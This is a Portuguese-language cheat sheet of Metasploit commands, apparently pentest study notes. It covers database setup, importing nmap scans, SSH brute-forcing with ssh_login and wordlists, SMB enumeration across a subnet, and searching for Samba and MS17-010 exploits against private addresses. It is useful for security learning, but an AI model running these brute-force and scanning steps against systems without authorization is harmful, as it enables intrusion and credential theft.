##   Metasploit Framework

base de dados do metasploit

`msfdb`

*Obs: Antes de inicializar a base dedados lembre-se de atualizar seu sistema.

veriricando status 

`msfdb status`

inicializando postgress

`systemctl start postgresql`

Inicializando

`msfdb init`

inicializando metasploit

`msfconsole`


## Módulos Auxiliares

Exibindo informações

`show -h`

utilizando search

`search -h`

`search ...`

`search type:....`

Utilizando o NMAP no metasploit

`db_nmap -v --open -sV -Pn 192.168.0.1`

Exportando dados do NMAP para posteriormente ser usado no metasploit

`nmap -v --open -sV -Pn 192.168.0.1 -oX /opt/host4.xml`

Importando para o metasploit

`db_import /opt/host4.xml`

Listando informações

`service`

`service -p 21`

`hosts`

`vulns`

## Ataques de força bruta

`search type:auxiliary ssh`

`use auxiliary/scanner/ssh/ssh_login`

`show options`

`nano /opt/users.txt`

`nano /opt/pass.txt`

`set RHOST 192.168.0.1`

`set THREADS 10`

`set USER_FILE /opt/users.txt`

`set PASS_FILE /opt/pass.txt`

`set VERBOSE true`

`run`

`sessions` 

`sessions -i 1`

`creds`

## Levantamento de Informações

`db_nmap -p 139,445 --open -Pn -sS 192.168.0/24`

`services`

`services -p 139`

`services -p 445`

`search type:auxiliary smb`

`use auxiliary/scanner/smb/smb_version`

`info`

`service -p 445 --rhosts`

`show options`

`run`

`hosts`

## Identificando Vulnerabilidades

`vulns`

`hosts -i "Samba x.x.x" 192.168.0.1`

`search type:exploit samba`

*Obs: observe a coluna rank e verifique os exploits que são excellent, pois estes funcionam de forma perfeita.*

`search type:exploit fullname: "Samba 3.0.20" `

`search type:auxiliary smb`

`use auxiliary/scanner/smb/smb_ms17_010`

`services -p 445`

`services -p 445 --rhosts`

`show options`

`run`





























